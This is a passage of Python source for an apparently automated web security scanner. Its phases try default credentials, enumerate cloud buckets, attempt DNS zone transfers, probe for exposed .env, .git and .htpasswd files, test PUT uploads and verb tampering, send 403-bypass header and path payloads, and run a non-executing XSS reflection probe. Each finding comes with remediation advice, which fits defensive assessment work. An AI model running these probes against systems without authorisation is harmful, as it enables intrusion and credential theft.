                has_success = success_text and success_text.lower() in body
                has_failure = failure_text and failure_text.lower() in body
                success = bool(has_success and not has_failure)
                evidence = f"POST {login_url} ({uf}={user}) → HTTP {r.status_code}"

            elif auth_type == "json":
                if uf is None or pf is None:
                    continue
                r = sess.post(login_url, json={uf: user, pf: pwd},
                              timeout=cfg.timeout)
                # Success = 2xx + auth token in body/cookies (heuristic)
                success = (r.status_code in (200, 201) and
                           any(k in r.text.lower() for k in ('token', 'session', 'authenticated', 'success')))
                evidence = f"POST {login_url} (json) → HTTP {r.status_code}\n{r.text[:200]}"

        except Exception as e:
            _log(out, f"> Login attempt failed for {login_path}: {e}")
            continue

        if success:
            add_finding(Finding(
                title=f"Default Credentials Valid: {login_path}",
                severity=Severity.CRITICAL,
                description=f"Default credentials `{user}`/`{pwd}` accepted at {login_path}",
                evidence=evidence,
                recommendation="Change default credentials immediately. Enforce a strong password policy.",
                phase=phase), out, cfg)

    st.mark(phase)


def phase_cloud_buckets(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "cloud_buckets"
    if st.done(phase): return
    section("Cloud Storage Bucket Enumeration", out)

    host = target.split(':')[0]
    parts = host.split('.')
    base_names = [parts[-2] if len(parts) >= 2 else host,
                  host.replace('.', '-'), host.replace('.', '')]
    suffixes = ['', '-backup', '-data', '-assets', '-static', '-media',
                '-uploads', '-dev', '-staging', '-prod', '-files', '-logs']
    sess = make_session(cfg)
    for base in list(dict.fromkeys(base_names))[:2]:
        for suffix in suffixes:
            name = f"{base}{suffix}"
            for url, cloud in [
                (f"https://{name}.s3.amazonaws.com/",         "S3"),
                (f"https://storage.googleapis.com/{name}/",   "GCS"),
                (f"https://{name}.blob.core.windows.net/",    "Azure"),
            ]:
                try:
                    r = sess.get(url, timeout=5)
                    if r.status_code == 200:
                        add_finding(Finding(
                            title=f"Public {cloud} Bucket: {name}",
                            severity=Severity.HIGH,
                            description=f"Publicly accessible {cloud} bucket: {url}",
                            evidence=f"GET {url} → HTTP 200\n{r.text[:300]}",
                            recommendation=f"Restrict {cloud} bucket ACL. Block public access policy.",
                            phase=phase), out, cfg)
                    elif r.status_code == 403:
                        _log(out, f"ℹ️ {cloud} bucket exists (private): {url}")
                except Exception:
                    continue
    st.mark(phase)


def phase_screenshots(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "screenshots"
    if st.done(phase): return
    section("Screenshots (gowitness)", out)
    if _tool_ok("gowitness", out):
        os.makedirs("./screenshots", exist_ok=True)
        run_cmd(["gowitness", "single", "--url", cfg.base_url,
                 "--screenshot-path", "./screenshots"],
                "gowitness", out, cfg, 60)
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 1+ — DNS SECURITY POSTURE (SPF / DMARC / DNSSEC / CAA / AXFR)
# ═════════════════════════════════════════════════════════════════════════════

def _dig(args: List[str], timeout: int = 10) -> str:
    """Thin dig wrapper. Returns stdout ('' on any failure)."""
    if not shutil.which("dig"):
        return ""
    try:
        r = subprocess.run(["dig", "+short"] + args,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""


def phase_dns_security(target: str, tt: TargetType, cfg: ScanConfig,
                       out: str, st: ScanState):
    """Passive DNS hardening review: SPF, DMARC, DNSSEC, CAA, plus an
    AXFR zone-transfer attempt against each authoritative nameserver."""
    phase = "dns_security"
    if st.done(phase) or tt != TargetType.DOMAIN:
        return
    section("DNS Security Posture (SPF / DMARC / DNSSEC / CAA / AXFR)", out)
    if not shutil.which("dig"):
        _log(out, "> dig not installed — skipping DNS security checks.")
        with _MISSING_TOOLS_LOCK:
            _MISSING_TOOLS.add("dig")
        st.mark(phase); return

    host = target.split(':')[0]

    # SPF
    spf = [l for l in _dig(["TXT", host]).splitlines() if 'v=spf1' in l.lower()]
    if not spf:
        add_finding(Finding(
            title="Missing SPF Record",
            severity=Severity.LOW,
            description="No SPF (v=spf1) TXT record found — eases email spoofing of this domain.",
            evidence=f"dig +short TXT {host} → no v=spf1",
            recommendation="Publish an SPF record ending in `-all` (hard fail) once senders are enumerated.",
            phase=phase), out, cfg)
    else:
        joined = ' '.join(spf).lower()
        _log(out, f"- SPF: `{spf[0][:300]}`")
        if '+all' in joined or ('~all' not in joined and '-all' not in joined):
            add_finding(Finding(
                title="Weak SPF Policy",
                severity=Severity.LOW,
                description="SPF record uses `+all`/`?all` or omits an `all` mechanism — does not restrict senders.",
                evidence=spf[0][:300],
                recommendation="Terminate the SPF record with `-all` (or at minimum `~all`).",
                phase=phase), out, cfg)

    # DMARC
    dmarc = [l for l in _dig(["TXT", f"_dmarc.{host}"]).splitlines() if 'v=dmarc1' in l.lower()]
    if not dmarc:
        add_finding(Finding(
            title="Missing DMARC Record",
            severity=Severity.MEDIUM,
            description="No DMARC record at _dmarc — receivers have no policy for SPF/DKIM failures, enabling spoofing.",
            evidence=f"dig +short TXT _dmarc.{host} → empty",
            recommendation="Publish a DMARC record, starting at `p=none` for monitoring then moving to `p=quarantine`/`p=reject`.",
            phase=phase), out, cfg)
    else:
        rec = dmarc[0].lower()
        _log(out, f"- DMARC: `{dmarc[0][:300]}`")
        if 'p=none' in rec:
            add_finding(Finding(
                title="DMARC Policy Not Enforced (p=none)",
                severity=Severity.LOW,
                description="DMARC is published but set to `p=none` — failures are only monitored, not blocked.",
                evidence=dmarc[0][:300],
                recommendation="Progress the policy to `p=quarantine` then `p=reject` after monitoring reports.",
                phase=phase), out, cfg)

    # DNSSEC
    dnskey = _dig(["DNSKEY", host])
    if not dnskey:
        add_finding(Finding(
            title="DNSSEC Not Enabled",
            severity=Severity.INFO,
            description="No DNSKEY records — the zone is not DNSSEC-signed and is exposed to DNS spoofing/cache poisoning.",
            evidence=f"dig +short DNSKEY {host} → empty",
            recommendation="Enable DNSSEC signing at the registrar/DNS provider where feasible.",
            phase=phase), out, cfg)
    else:
        _log(out, "- DNSSEC: DNSKEY present (zone signed)")

    # CAA
    caa = _dig(["CAA", host])
    if not caa:
        add_finding(Finding(
            title="No CAA Record",
            severity=Severity.INFO,
            description="No CAA record — any CA may issue certificates for this domain.",
            evidence=f"dig +short CAA {host} → empty",
            recommendation="Publish a CAA record restricting issuance to approved CAs.",
            phase=phase), out, cfg)
    else:
        _log(out, f"- CAA: `{caa[:200]}`")

    # Zone transfer (AXFR) against each NS
    nameservers = [n.rstrip('.') for n in _dig(["NS", host]).splitlines() if n.strip()]
    _log(out, f"- Nameservers: {', '.join(nameservers) or 'none resolved'}")
    for ns in nameservers[:6]:
        try:
            r = subprocess.run(["dig", f"@{ns}", host, "AXFR", "+time=5", "+tries=1"],
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               text=True, timeout=15)
            body = r.stdout
            # A real transfer dumps many records; failures say "Transfer failed"/"connection timed out"
            if "Transfer failed" not in body and "connection timed out" not in body \
               and body.count("IN") >= 5 and "SOA" in body:
                add_finding(Finding(
                    title=f"DNS Zone Transfer Allowed: {ns}",
                    severity=Severity.HIGH,
                    description=f"Nameserver {ns} permits AXFR zone transfer, leaking the full DNS zone for {host}.",
                    evidence=f"dig @{ns} {host} AXFR returned {body.count(chr(10))} lines\n{body[:600]}",
                    recommendation="Restrict AXFR to authorised secondaries only (allow-transfer ACL).",
                    phase=phase), out, cfg)
                # Mine transferred A/CNAME hostnames into DISCOVERED context
                hosts = re.findall(r'^(\S+?)\.\s+\d+\s+IN\s+(?:A|AAAA|CNAME)', body, re.M)
                if hosts:
                    _log(out, f"  → {len(hosts)} hostnames recovered from zone transfer")
        except Exception:
            continue
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 3+ — API SCHEMA DISCOVERY (OpenAPI / Swagger / WSDL)
# Force-multiplier: parses schemas into DISCOVERED endpoints+params so that
# every downstream injection phase (SQLi/XSS/SSRF/traversal) gets real surface.
# ═════════════════════════════════════════════════════════════════════════════

def phase_api_schema(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "api_schema"
    if st.done(phase): return
    section("API Schema Discovery (OpenAPI / Swagger / WSDL)", out)
    sess = make_session(cfg)

    schema_paths = [
        "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/openapi.json", "/openapi.yaml", "/api-docs", "/api/api-docs",
        "/v2/api-docs", "/v3/api-docs", "/api/swagger.json", "/api/v1/swagger.json",
        "/swagger-ui.html", "/swagger/index.html", "/api/openapi.json",
        "/.well-known/openapi.json", "/docs/swagger.json", "/redoc",
        "/api/docs", "/graphql/schema.json",
    ]

    found_specs = []
    for path in schema_paths:
        url = f"{cfg.base_url}{path}"
        try:
            r = sess.get(url, timeout=cfg.timeout, allow_redirects=True)
            if r.status_code != 200 or len(r.content) < 30:
                continue
            if looks_like_catchall(cfg, r.text, len(r.content)):
                continue
            ctype = r.headers.get('Content-Type', '').lower()
            # Swagger UI HTML page (not the spec itself)
            if 'html' in ctype and ('swagger-ui' in r.text.lower() or 'redoc' in r.text.lower()):
                add_finding(Finding(
                    title=f"API Documentation UI Exposed: {path}",
                    severity=Severity.LOW,
                    description=f"Interactive API docs reachable at {path} — exposes the full API surface to anonymous users.",
                    evidence=f"GET {url} → HTTP 200 (Swagger UI / ReDoc)",
                    recommendation="Restrict API documentation UIs to authenticated/internal users in production.",
                    phase=phase), out, cfg)
                continue
            # Try to parse a JSON spec
            try:
                spec = r.json()
            except Exception:
                continue
            if not isinstance(spec, dict):
                continue
            is_openapi = 'openapi' in spec or 'swagger' in spec or 'paths' in spec
            if not is_openapi:
                continue
            found_specs.append(path)

            paths_obj = spec.get('paths', {}) or {}
            base_path = spec.get('basePath', '') or ''
            servers = spec.get('servers', [])
            server_prefix = ''
            if servers and isinstance(servers, list) and isinstance(servers[0], dict):
                try:
                    server_prefix = urlparse(servers[0].get('url', '')).path or ''
                except Exception:
                    server_prefix = ''
            prefix = server_prefix or base_path

            endpoints, params = set(), set()
            for ep, methods in paths_obj.items():
                full_ep = (prefix.rstrip('/') + '/' + ep.lstrip('/')) if prefix else ep
                endpoints.add(full_ep)
                if isinstance(methods, dict):
                    for verb, op in methods.items():
                        if not isinstance(op, dict):
                            continue
                        for prm in op.get('parameters', []) or []:
                            if isinstance(prm, dict) and prm.get('name'):
                                params.add(prm['name'])
                # Path templating {id} → param name
                for m in re.findall(r'\{([^}]+)\}', ep):
                    params.add(m)

            # Feed into shared discovery state for downstream phases
            DISCOVERED.add_urls([urljoin(cfg.base_url, e) for e in endpoints if e.startswith('/')])
            DISCOVERED.add_params(params)

            add_finding(Finding(
                title=f"OpenAPI/Swagger Spec Exposed: {path}",
                severity=Severity.MEDIUM,
                description=(f"Machine-readable API spec at {path} reveals "
                             f"{len(endpoints)} endpoints and {len(params)} parameters. "
                             f"All have been fed into downstream injection testing."),
                evidence=(f"GET {url} → HTTP 200\nTitle: "
                          f"{spec.get('info', {}).get('title', '?')}\n"
                          f"Endpoints (sample): " + ', '.join(sorted(endpoints)[:15])),
                recommendation="Confirm the spec is intended to be public. Ensure documented endpoints enforce authn/authz.",
                phase=phase), out, cfg)
            print(f"  {Fore.GREEN}✓ API spec {path}: {len(endpoints)} endpoints, {len(params)} params → DISCOVERED")
        except Exception:
            continue

    # WSDL (SOAP) discovery
    for path in ("?wsdl", "/service?wsdl", "/services?wsdl", "/soap?wsdl"):
        try:
            url = f"{cfg.base_url}{path}"
            r = sess.get(url, timeout=cfg.timeout)
            tl = r.text.lower()
            if r.status_code == 200 and ('<wsdl:definitions' in tl or ('<definitions' in tl and 'soap' in tl)):
                if looks_like_catchall(cfg, r.text, len(r.content)):
                    continue
                ops = re.findall(r'<(?:wsdl:)?operation\s+name="([^"]+)"', r.text)
                add_finding(Finding(
                    title=f"SOAP WSDL Exposed: {path}",
                    severity=Severity.MEDIUM,
                    description=f"A WSDL service definition is reachable at {path} ({len(set(ops))} operations).",
                    evidence=f"GET {url} → HTTP 200\nOperations: {', '.join(sorted(set(ops))[:15])}",
                    recommendation="Restrict WSDL exposure; ensure each SOAP operation enforces authentication.",
                    phase=phase), out, cfg)
        except Exception:
            continue

    if not found_specs:
        _log(out, "> No machine-readable API schema found at common locations.")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 3+ — SOURCE / VCS / CONFIG EXPOSURE
# ═════════════════════════════════════════════════════════════════════════════

def phase_source_exposure(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Detect exposed VCS metadata, dotfiles, configs and backup/swap files.
    Each hit requires a content signature to avoid catch-all/200 false positives."""
    phase = "source_exposure"
    if st.done(phase): return
    section("Source / VCS / Config Exposure", out)
    sess = make_session(cfg)

    # (path, severity, signature_predicate(text)->bool, recommendation)
    CHECKS = [
        ("/.git/HEAD", Severity.HIGH,
         lambda t: t.strip().startswith("ref:") or re.match(r'^[0-9a-f]{40}$', t.strip()),
         "Remove the .git directory from the web root; serve only built assets."),
        ("/.git/config", Severity.HIGH,
         lambda t: "[core]" in t or "[remote" in t,
         "Remove .git from production. The repo (incl. history/secrets) may be fully recoverable."),
        ("/.svn/entries", Severity.HIGH,
         lambda t: t.strip().startswith(("8", "9", "10", "11", "12")) or "svn" in t.lower(),
         "Remove .svn metadata from the web root."),
        ("/.svn/wc.db", Severity.HIGH,
         lambda t: t[:15].startswith("SQLite format"),
         "Remove .svn metadata; the working-copy DB exposes file paths."),
        ("/.hg/requires", Severity.MEDIUM,
         lambda t: "revlog" in t or "store" in t,
         "Remove Mercurial metadata from the web root."),
        ("/.DS_Store", Severity.LOW,
         lambda t: "Bud1" in t[:32],
         "Remove .DS_Store files; they leak directory/file listings."),
        ("/.env", Severity.CRITICAL,
         lambda t: re.search(r'(?im)^[A-Z0-9_]+=', t) is not None,
         "Remove .env from the web root immediately and rotate any exposed secrets."),
        ("/.env.local", Severity.CRITICAL,
         lambda t: re.search(r'(?im)^[A-Z0-9_]+=', t) is not None,
         "Remove environment files from the web root and rotate exposed secrets."),
        ("/.htpasswd", Severity.HIGH,
         lambda t: ":" in t and ("$apr1$" in t or "$2y$" in t or re.search(r'^\w+:\S+$', t, re.M)),
         "Move .htpasswd outside the web root; rotate affected credentials."),
        ("/.bash_history", Severity.MEDIUM,
         lambda t: bool(t.strip()) and "\n" in t,
         "Remove shell history files from web-accessible directories."),
        ("/composer.json", Severity.LOW,
         lambda t: '"require"' in t or '"name"' in t,
         "Confirm exposure is intended; dependency versions aid targeted attacks."),
        ("/package.json", Severity.LOW,
         lambda t: '"dependencies"' in t or '"name"' in t,
         "Confirm exposure is intended; dependency versions aid targeted attacks."),
        ("/Dockerfile", Severity.LOW,
         lambda t: re.search(r'(?im)^(FROM|RUN|COPY|ENV)\s', t) is not None,
         "Avoid serving build files; they reveal infrastructure detail."),
        ("/docker-compose.yml", Severity.MEDIUM,
         lambda t: "services:" in t or "image:" in t,
         "Remove compose files from the web root; they often embed credentials."),
        ("/server-status", Severity.MEDIUM,
         lambda t: "Apache Server Status" in t,
         "Restrict mod_status (/server-status) to localhost/trusted IPs."),
        ("/server-info", Severity.MEDIUM,
         lambda t: "Apache Server Information" in t,
         "Disable or restrict mod_info (/server-info)."),
        ("/phpinfo.php", Severity.HIGH,
         lambda t: "phpinfo()" in t or "PHP Version" in t,
         "Remove phpinfo() pages from production."),
    ]

    # Backup/swap variants generated for the index document
    backup_targets = [
        "/index.php~", "/index.php.bak", "/index.php.old", "/index.php.save",
        "/.index.php.swp", "/index.bak", "/index.html.bak", "/web.config.bak",
        "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sql", "/dump.sql",
        "/database.sql", "/www.zip", "/site.zip", "/wwwroot.zip", "/.config.php.swp",
    ]

    for path, sev, sig, rec in CHECKS:
        try:
            r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout, allow_redirects=False)
            if r.status_code != 200 or len(r.content) < 3:
                continue
            if looks_like_catchall(cfg, r.text, len(r.content)):
                continue
            if not sig(r.text):
                continue
            add_finding(Finding(
                title=f"Exposed File: {path}",
                severity=sev,
                description=f"`{path}` is publicly accessible and matched its content signature.",
                evidence=f"GET {cfg.base_url}{path} → HTTP 200 ({len(r.content)} bytes)\n{r.text[:300]}",
                recommendation=rec,
                phase=phase), out, cfg)
        except Exception:
            continue

    # Backup/swap files — confirmation = non-HTML or sizeable body that isn't catch-all
    for path in backup_targets:
        try:
            r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout, allow_redirects=False)
            if r.status_code != 200 or len(r.content) < 16:
                continue
            if looks_like_catchall(cfg, r.text, len(r.content)):
                continue
            ctype = r.headers.get('Content-Type', '').lower()
            looks_archive = any(s in ctype for s in ('zip', 'octet-stream', 'gzip', 'sql', 'x-tar'))
            looks_source = path.endswith(('~', '.bak', '.old', '.save', '.swp')) and 'html' not in ctype
            if looks_archive or looks_source or '<?php' in r.text[:200]:
                add_finding(Finding(
                    title=f"Backup / Swap File Exposed: {path}",
                    severity=Severity.HIGH,
                    description=f"A backup or editor swap file is downloadable at {path}, potentially leaking source or data.",
                    evidence=f"GET {cfg.base_url}{path} → HTTP 200\nContent-Type: {ctype}\nSize: {len(r.content)} bytes",
                    recommendation="Remove backup/swap files from the web root and block these extensions at the server.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 4+ — HTTP METHODS & VERB TAMPERING
# ═════════════════════════════════════════════════════════════════════════════

def phase_http_methods(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Enumerate allowed methods; test TRACE (XST), dangerous verbs, and
    verb-based auth bypass. A live PUT upload test runs only when intrusive
    checks are permitted, and any uploaded canary is deleted afterwards."""
    phase = "http_methods"
    if st.done(phase): return
    section("HTTP Methods & Verb Tampering", out)
    sess = make_session(cfg)

    # OPTIONS — advertised methods
    try:
        r = sess.options(cfg.base_url, timeout=cfg.timeout)
        allow = r.headers.get('Allow', '') or r.headers.get('Access-Control-Allow-Methods', '')
        if allow:
            _log(out, f"- Allowed methods (OPTIONS): `{allow}`")
            risky = [m for m in ('PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT')
                     if m in allow.upper()]
            if risky:
                add_finding(Finding(
                    title=f"Potentially Dangerous HTTP Methods Advertised: {', '.join(risky)}",
                    severity=Severity.LOW,
                    description=f"The server advertises {', '.join(risky)} via OPTIONS.",
                    evidence=f"Allow: {allow}",
                    recommendation="Disable unused methods (PUT/DELETE/TRACE/CONNECT) at the web server/WAF.",
                    phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> OPTIONS failed: {e}")

    # TRACE → Cross-Site Tracing (XST)
    try:
        r = sess.request("TRACE", cfg.base_url, timeout=cfg.timeout)
        if r.status_code == 200 and 'TRACE' in r.text[:200].upper():
            add_finding(Finding(
                title="HTTP TRACE Enabled (XST)",
                severity=Severity.MEDIUM,
                description="The server responds to TRACE and echoes the request — enabling Cross-Site Tracing.",
                evidence=f"TRACE {cfg.base_url} → HTTP 200, request echoed\n{r.text[:200]}",
                recommendation="Disable the TRACE method (TraceEnable Off / equivalent).",
                phase=phase), out, cfg)
    except Exception:
        pass

    # Live PUT upload test (intrusive only)
    if not cfg.no_intrusive:
        canary = f"webrecon-{hashlib.md5(os.urandom(8)).hexdigest()[:10]}.txt"
        marker = f"webrecon-put-{hashlib.md5(os.urandom(8)).hexdigest()[:8]}"
        put_url = f"{cfg.base_url}/{canary}"
        try:
            pr = sess.put(put_url, data=marker, timeout=cfg.timeout)
            if pr.status_code in (200, 201, 204):
                vr = sess.get(put_url, timeout=cfg.timeout)
                if vr.status_code == 200 and marker in vr.text:
                    add_finding(Finding(
                        title="Arbitrary File Upload via HTTP PUT",
                        severity=Severity.CRITICAL,
                        description="An anonymous PUT request created a retrievable file on the server.",
                        evidence=f"PUT {put_url} → HTTP {pr.status_code}; GET confirmed marker present.",
                        recommendation="Disable PUT (and WebDAV) or require strict authentication/authorisation.",
                        phase=phase), out, cfg)
                # Clean up regardless
                try: sess.delete(put_url, timeout=cfg.timeout)
                except Exception: pass
        except Exception:
            pass

    # Verb-based auth bypass against protected paths
    protected = ["/admin", "/admin/", "/manager/html", "/api/admin",
                 "/dashboard", "/private", "/internal"]
    with DISCOVERED._lock:
        protected += [e for e in DISCOVERED.endpoints
                      if any(k in e.lower() for k in ('admin', 'manage', 'internal', 'private'))][:10]
    for path in list(dict.fromkeys(protected)):
        url = f"{cfg.base_url}{path}"
        try:
            base = sess.get(url, timeout=cfg.timeout, allow_redirects=False)
        except Exception:
            continue
        if base.status_code not in (401, 403):
            continue
        # Try alternative verbs that some frameworks fail to gate
        for verb in ("HEAD", "POST", "PUT", "PATCH", "TRACK", "FOOBAR"):
            try:
                vr = sess.request(verb, url, timeout=cfg.timeout, allow_redirects=False)
                if vr.status_code in (200, 201, 202, 204):
                    add_finding(Finding(
                        title=f"Verb-Based Auth Bypass: {verb} {path}",
                        severity=Severity.HIGH,
                        description=f"`{path}` returns {base.status_code} for GET but {vr.status_code} for {verb} — access control is method-dependent.",
                        evidence=f"GET {url} → {base.status_code}\n{verb} {url} → {vr.status_code}",
                        recommendation="Enforce authorisation on all HTTP methods, not just GET/POST. Deny unknown verbs.",
                        phase=phase), out, cfg)
                    break
            except Exception:
                continue
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 4+ — 401/403 BYPASS (path-normalisation + header overrides)
# ═════════════════════════════════════════════════════════════════════════════

def phase_403_bypass(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "forbidden_bypass"
    if st.done(phase): return
    section("401 / 403 Access-Control Bypass", out)
    sess = make_session(cfg)

    candidates = ["/admin", "/admin/", "/manager/html", "/api/admin", "/dashboard",
                  "/private", "/internal", "/.git/config", "/server-status"]
    with DISCOVERED._lock:
        candidates += list(DISCOVERED.endpoints)[:15]

    def _payloads(path: str):
        p = path.rstrip('/')
        # (label, url_suffix, extra_headers)
        return [
            ("trailing-slash",     path + "/", {}),
            ("trailing-dot",       p + "/.",   {}),
            ("double-slash",       "/" + path.lstrip('/'), {}),  # leading // handled by server
            ("path-%2e",           p + "/%2e/", {}),
            ("semicolon",          p + "/..;/", {}),
            ("encoded-slash",      p + "%2f", {}),
            ("uppercase",          p.upper() if p.lower() != p.upper() else p, {}),
            ("x-original-url",     "/",  {"X-Original-URL": path}),
            ("x-rewrite-url",      "/",  {"X-Rewrite-URL": path}),
            ("x-forwarded-for",    path, {"X-Forwarded-For": "127.0.0.1"}),
            ("x-custom-ip-auth",   path, {"X-Custom-IP-Authorization": "127.0.0.1"}),
            ("x-originating-ip",   path, {"X-Originating-IP": "127.0.0.1"}),
            ("referer-self",       path, {"Referer": cfg.base_url + path}),
        ]

    seen = set()
    for path in list(dict.fromkeys(candidates)):
        if not path.startswith('/') or path in seen:
            continue
        seen.add(path)
        try:
            base = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout, allow_redirects=False)
        except Exception:
            continue
        if base.status_code not in (401, 403):
            continue
        base_len = len(base.content)
        for label, suffix, hdrs in _payloads(path):
            try:
                r = sess.get(f"{cfg.base_url}{suffix}", headers=hdrs or None,
                             timeout=cfg.timeout, allow_redirects=False)
                # Bypass = now 2xx AND content differs meaningfully from the 403 page
                if r.status_code in (200, 201, 202, 206) and abs(len(r.content) - base_len) > 32:
                    add_finding(Finding(
                        title=f"403/401 Bypass ({label}): {path}",
                        severity=Severity.HIGH,
                        description=f"`{path}` returns {base.status_code} normally but {r.status_code} using the `{label}` technique.",
                        evidence=(f"Baseline: GET {path} → {base.status_code} ({base_len} bytes)\n"
                                  f"Bypass:   {label} → {r.status_code} ({len(r.content)} bytes)\n"
                                  f"Headers:  {hdrs}"),
                        recommendation="Normalise paths before authorisation; do not trust X-Original-URL/X-Rewrite-URL or client IP headers for access decisions.",
                        phase=phase), out, cfg)
                    break
            except Exception:
                continue
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 4+ — CONTENT-SECURITY-POLICY DEEP ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def phase_csp_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "csp_analysis"
    if st.done(phase): return
    section("Content-Security-Policy Analysis", out)
    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout, allow_redirects=True)
    except Exception as e:
        _log(out, f"> CSP fetch failed: {e}")
        st.mark(phase); return

    csp = r.headers.get('Content-Security-Policy', '')
    if not csp:
        # Meta-tag CSP
        m = re.search(r'<meta[^>]+http-equiv=["\']content-security-policy["\'][^>]+content=["\']([^"\']+)',
                      r.text, re.I)
        if m:
            csp = m.group(1)
    if not csp:
        _log(out, "> No CSP present (already reported by header phase).")
        st.mark(phase); return

    _log(out, f"- CSP: `{csp[:500]}`")
    directives = {}
    for part in csp.split(';'):
        part = part.strip()
        if not part:
            continue
        toks = part.split()
        directives[toks[0].lower()] = [t.lower() for t in toks[1:]]

    script_src = directives.get('script-src', directives.get('default-src', []))
    issues = []
    if "'unsafe-inline'" in script_src and "'strict-dynamic'" not in script_src \
       and not any(s.startswith("'nonce-") or s.startswith("'sha") for s in script_src):
        issues.append(("'unsafe-inline' in script-src without nonce/hash/strict-dynamic", Severity.MEDIUM))
    if "'unsafe-eval'" in script_src:
        issues.append(("'unsafe-eval' permitted in script-src", Severity.MEDIUM))
    if '*' in script_src:
        issues.append(("Wildcard '*' source in script-src/default-src", Severity.MEDIUM))
    if any(s in ('data:', 'http:', 'https:') for s in script_src):
        issues.append(("Overly-broad scheme source (data:/http:/https:) in script-src", Severity.LOW))
    if 'object-src' not in directives and 'default-src' not in directives:
        issues.append(("Missing object-src (recommend object-src 'none')", Severity.LOW))
    if 'base-uri' not in directives:
        issues.append(("Missing base-uri (allows <base> tag injection)", Severity.LOW))
    if 'frame-ancestors' not in directives:
        issues.append(("Missing frame-ancestors (clickjacking control)", Severity.LOW))

    for desc, sev in issues:
        add_finding(Finding(
            title=f"Weak CSP: {desc.split('(')[0].strip()}",
            severity=sev,
            description=f"Content-Security-Policy weakness: {desc}.",
            evidence=f"CSP: {csp[:400]}",
            recommendation="Tighten the CSP: prefer nonces/hashes + 'strict-dynamic', set object-src 'none', base-uri 'self', and frame-ancestors.",
            phase=phase), out, cfg)
    if not issues:
        _log(out, "- CSP present and no obvious weaknesses in script-src/object-src/base-uri/frame-ancestors.")
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5+ — REFLECTED INPUT / XSS CONTEXT PROBE  (safe, non-executing)
# Injects a unique alphanumeric marker plus the raw chars " ' < > to see which
# survive unencoded, and in what context. It NEVER injects an executable
# payload — context + unescaped special chars are reported for manual follow-up.
# ═════════════════════════════════════════════════════════════════════════════

def phase_reflection_xss(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "reflection_xss"
    if st.done(phase): return
    section("Reflected Input / XSS Context Probe", out)
    sess = make_session(cfg)

    marker = "wrx" + hashlib.md5(os.urandom(6)).hexdigest()[:6]
    # Distinctive, non-executing probe. Special chars test output encoding.
    probe_chars = "<>\"'"
    probe = f"{marker}{probe_chars}{marker}"

    targets = DISCOVERED.get_urls_with_params(limit=40)
    # Also probe common params on the base URL
    common = ['q', 'search', 's', 'query', 'name', 'id', 'page', 'lang', 'redirect',
              'keyword', 'term', 'msg', 'message', 'ref', 'callback']
    base_targets = [f"{cfg.base_url}?{p}={probe}" for p in common]

    tested = 0
    reported_params: Set[str] = set()  # one report per (param) to avoid cross-source dupes
    for tgt in (targets + base_targets):
        if tested >= 60:
            break
        try:
            parsed = urlparse(tgt)
            qs = parse_qs(parsed.query)
            if not qs:
                continue
            # Replace each param's value with the probe, one at a time
            for pname in list(qs.keys()):
                if pname in reported_params:
                    continue
                newqs = {k: (probe if k == pname else v[0]) for k, v in qs.items()}
                query = '&'.join(f"{k}={v}" for k, v in newqs.items())
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                r = sess.get(test_url, timeout=cfg.timeout)
                tested += 1
                if marker not in r.text:
                    continue
                ctype = r.headers.get('Content-Type', '').lower()
                # Find what surrounds the marker
                idx = r.text.find(marker)
                window = r.text[max(0, idx - 1):idx + len(probe) + 1]
                lt_raw = "<" in window
                gt_raw = ">" in window
                quote_raw = ('"' in window) or ("'" in window)
                # Determine reflection context heuristically
                pre = r.text[max(0, idx - 60):idx].lower()
                if '<script' in pre and '</script>' not in pre:
                    context = "inside <script> (JS)"
                elif re.search(r'=\s*["\'][^"\']*$', r.text[max(0, idx-80):idx]):
                    context = "HTML attribute value"
                elif 'json' in ctype:
                    context = "JSON response"
                else:
                    context = "HTML body"

                reported_params.add(pname)
                if lt_raw and gt_raw:
                    sev = Severity.HIGH if 'json' not in ctype else Severity.LOW
                    add_finding(Finding(
                        title=f"Reflected Input — Unescaped `<>` via `{pname}`",
                        severity=sev,
                        description=(f"Parameter `{pname}` is reflected into the response in context "
                                     f"[{context}] with `<` and `>` UNescaped — strong XSS indicator. "
                                     f"(Probe was non-executing; confirm manually.)"),
                        evidence=f"URL: {test_url}\nContext: {context}\nReflected window: {window[:120]}",
                        recommendation="Context-aware output encoding (HTML-entity encode <,>,\",',&). Add a strong CSP as defence-in-depth.",
                        phase=phase), out, cfg)
                elif quote_raw and context in ("HTML attribute value", "inside <script> (JS)"):
                    add_finding(Finding(
                        title=f"Reflected Input — Unescaped Quote via `{pname}`",
                        severity=Severity.MEDIUM,
                        description=(f"Parameter `{pname}` is reflected into [{context}] with quote characters "
                                     f"unescaped — may allow breaking out of the current context."),
                        evidence=f"URL: {test_url}\nContext: {context}\nReflected window: {window[:120]}",
                        recommendation="Encode quotes for the relevant context; avoid reflecting input into attribute/JS contexts.",
                        phase=phase), out, cfg)
                else:
